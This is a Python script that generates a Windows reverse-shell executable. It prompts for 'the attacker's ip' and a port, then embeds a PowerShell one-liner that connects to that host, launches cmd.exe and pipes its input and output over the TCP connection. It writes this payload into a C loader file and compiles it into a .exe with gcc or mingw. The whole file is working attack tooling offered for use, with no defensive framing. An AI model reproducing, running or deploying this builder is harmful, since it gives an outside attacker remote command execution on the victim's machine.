import subprocess
import platform


ip = input("Enter the attacker's ip: ")
port = input("Enter port: ")
name = input("Enter the name of file: ")

if name.endswith(".exe"):
    pass
else:
    name = name + ".exe"


payload = "powershell -c \\\"function cleanup {if ($client.Connected -eq $true) {$client.Close()};if ($process.ExitCode -ne $null) {$process.Close()};exit};$address = '" + ip + "';$port = '"+ port +"';$client = New-Object system.net.sockets.tcpclient;$client.connect($address,$port);$stream = $client.GetStream();$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize;$process = New-Object System.Diagnostics.Process;$process.StartInfo.FileName = 'cmd.exe';$process.StartInfo.RedirectStandardInput = 1;$process.StartInfo.RedirectStandardOutput = 1;$process.StartInfo.UseShellExecute = 0;$process.Start();$inputstream = $process.StandardInput;$outputstream = $process.StandardOutput;Start-Sleep 1;$encoding = new-object System.Text.AsciiEncoding;while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())};$stream.Write($encoding.GetBytes($out),0,$out.Length);$out = $null; $done = $false; $testing = 0;while (-not $done) {if ($client.Connected -ne $true) {cleanup};$pos = 0; $i = 1;while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos);$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}};if ($pos -gt 0) {$string = $encoding.GetString($networkbuffer,0,$pos);$inputstream.write($string);start-sleep 1;if ($process.ExitCode -ne $null) {cleanup} else {$out = $encoding.GetString($outputstream.Read());while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}};$stream.Write($encoding.GetBytes($out),0,$out.length);$out = $null;$string = $null}} else {cleanup}};\\\""

lines = None
with open("powershell_loader.c", "r") as file:
    lines = file.readlines()
    for i in range(len(lines)):
        if "char text[]" in lines[i]:
            lines[i] = f"    char text[] = \"{payload}\";\n"


with open("powershell_loader.c", "w") as file:
    file.writelines(lines)
    
output = None
if platform.system() == "Windows":
    output = subprocess.Popen(f"gcc powershell_loader.c -O2 -o {name}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
else:
    output = subprocess.Popen(f"x86_64-w64-mingw32-g++ powershell_loader.c -O2 -o {name}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
std_out, std_err = output.communicate()

if std_err.decode() != '':
    print("Error generating exe file.")
    print(f"Error: {std_err.decode()}")

else:
    print("Exe successfully generated")

